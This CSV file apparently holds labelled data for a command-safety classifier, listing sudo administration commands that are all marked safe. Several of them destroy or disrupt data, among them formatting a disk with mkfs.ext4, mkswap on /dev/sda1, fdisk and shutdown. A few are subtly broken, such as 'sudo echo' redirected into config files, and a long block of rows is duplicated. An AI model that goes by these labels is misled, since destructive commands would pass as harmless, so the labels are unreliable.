isSafe,command
1,sudo mount /dev/sdb1 /mnt/usb
1,sudo umount /mnt/usb
1,sudo whoami
1,sudo hostnamectl set-hostname newhostname
1,sudo timedatectl set-timezone Europe/Paris
1,sudo journalctl -xe
1,sudo tail -f /var/log/syslog
1,sudo echo 'PermitRootLogin no' >> /etc/ssh/sshd_config
1,sudo ssh-keygen -t rsa -b 4096
1,sudo ufw enable
1,sudo ufw allow 22
1,sudo ufw deny 80
1,sudo lsof -i :80
1,sudo netstat -tuln
1,sudo ip addr show
1,sudo rsync -avz /home/user/ /backup/user/
1,sudo scp /home/user/file.txt user@remote:/path/
1,sudo traceroute google.com
1,sudo ping -c 4 8.8.8.8
1,sudo curl https://example.com
1,sudo wget http://example.com/file.zip
1,sudo systemctl restart nginx
1,sudo systemctl stop mysql
1,sudo systemctl start docker
1,sudo find /var/www/ -type f -name "*.html"
1,sudo grep "error" /var/log/syslog
1,sudo awk '{print $1}' /var/log/syslog
1,sudo sed -i 's/AllowOverride None/AllowOverride All/g' /etc/apache2/apache2.conf
1,sudo touch /var/www/html/newfile.html
1,sudo mkdir /opt/newdir
1,sudo rmdir /opt/olddir
1,sudo ln -s /var/www/html /home/user/html_link
1,sudo df -i
1,sudo fdisk -l
1,sudo blkid /dev/sda1
1,sudo mkfs.ext4 /dev/sdb1
1,sudo fsck /dev/sdb1
1,sudo partprobe /dev/sdb
1,sudo tune2fs -l /dev/sda1
1,sudo systemctl list-units --type=service
1,sudo systemctl enable apache2
1,sudo systemctl disable apache2
1,sudo systemctl reload apache2
1,sudo systemctl daemon-reload
1,sudo service mysql start
1,sudo service mysql stop
1,sudo service mysql restart
1,sudo service mysql status
1,sudo service apache2 reload
1,sudo apt-get install curl
1,sudo apt-get remove curl
1,sudo apt-get install vim
1,sudo apt-cache search nginx
1,sudo dnf update
1,sudo dnf autoremove
1,sudo dnf search docker
1,sudo yum update -y
1,sudo yum search httpd
1,sudo yum autoremove -y
1,sudo chmod 755 /usr/local/bin/myscript.sh
1,sudo chown root:root /usr/local/bin/myscript.sh
1,sudo stat /etc/passwd
1,sudo lsof /var/log/syslog
1,sudo du -a /home/user/
1,sudo df -T
1,sudo tcpdump -i eth0
1,sudo ip route show
1,sudo ip link set dev eth0 up
1,sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
1,sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
1,sudo iptables-save > /etc/iptables/rules.v4
1,sudo iptables-restore < /etc/iptables/rules.v4
1,sudo route -n
1,sudo sysctl -p
1,sudo lsblk
1,sudo hdparm -i /dev/sda
1,sudo fdisk /dev/sda
1,sudo dd if=/dev/sda of=/dev/null bs=512
1,sudo fuser -m /mnt/usb
1,sudo umask 022
1,sudo sync
1,sudo swapon /dev/sda1
1,sudo swapoff /dev/sda1
1,sudo mkswap /dev/sda1
1,sudo dmidecode -t memory
1,sudo lshw -short
1,sudo smartctl -a /dev/sda
1,sudo iotop
1,sudo iostat -xz 1
1,sudo nmap -sP 192.168.1.0/24
1,sudo ip neigh show
1,sudo arp -a
1,sudo ss -tuln
1,sudo ethtool eth0
1,sudo mtr google.com
1,sudo iwconfig
1,sudo modprobe nf_conntrack
1,sudo lsmod
1,sudo rmmod nf_conntrack
1,sudo modinfo nf_conntrack
1,sudo uname -a
1,sudo dmesg | tail
1,sudo journalctl -b
1,sudo systemctl isolate multi-user.target
1,sudo systemctl set-default graphical.target
1,sudo service ntp restart
1,sudo timedatectl status
1,sudo hwclock --systohc
1,sudo lsof -u username
1,sudo lsof /var/log
1,sudo strace -c ls
1,sudo gdb --batch -ex "run" -ex "bt" --args /usr/bin/command
1,sudo vmstat 5
1,sudo watch -n 1 df -h
1,sudo top
1,sudo htop
1,sudo free -m
1,sudo uptime
1,sudo shutdown -h now
1,sudo reboot
1,sudo cp /etc/hosts /backup/
1,sudo mv /backup/hosts /etc/
1,sudo ln -s /backup/hosts /etc/hosts
1,sudo touch /home/user/newfile.txt
1,sudo echo "127.0.0.1 localhost" >> /etc/hosts
1,sudo lsblk
1,sudo hdparm -i /dev/sda
1,sudo fdisk /dev/sda
1,sudo dd if=/dev/sda of=/dev/null bs=512
1,sudo fuser -m /mnt/usb
1,sudo umask 022
1,sudo sync
1,sudo swapon /dev/sda1
1,sudo swapoff /dev/sda1
1,sudo mkswap /dev/sda1
1,sudo dmidecode -t memory
1,sudo lshw -short
1,sudo smartctl -a /dev/sda
1,sudo iotop
1,sudo iostat -xz 1
1,sudo nmap -sP 192.168.1.0/24
1,sudo ip neigh show
1,sudo arp -a
1,sudo ss -tuln
1,sudo ethtool eth0
1,sudo mtr google.com
1,sudo iwconfig
1,sudo modprobe nf_conntrack
1,sudo lsmod
1,sudo rmmod nf_conntrack
1,sudo modinfo nf_conntrack
1,sudo uname -a
1,sudo dmesg | tail
1,sudo journalctl -b
1,sudo systemctl isolate multi-user.target
1,sudo systemctl set-default graphical.target
1,sudo service ntp restart
1,sudo timedatectl status
1,sudo hwclock --systohc
1,sudo lsof -u username
1,sudo lsof /var/log
1,sudo strace -c ls
1,sudo gdb --batch -ex "run" -ex "bt" --args /usr/bin/command
1,sudo vmstat 5
1,sudo watch -n 1 df -h
1,sudo top
1,sudo htop
1,sudo free -m
1,sudo uptime
1,sudo shutdown -h now
1,sudo reboot
1,sudo cp /etc/hosts /backup/
1,sudo mv /backup/hosts /etc/
1,sudo ln -s /backup/hosts /etc/hosts
1,sudo touch /home/user/newfile.txt
1,sudo echo "127.0.0.1 localhost" >> /etc/hosts

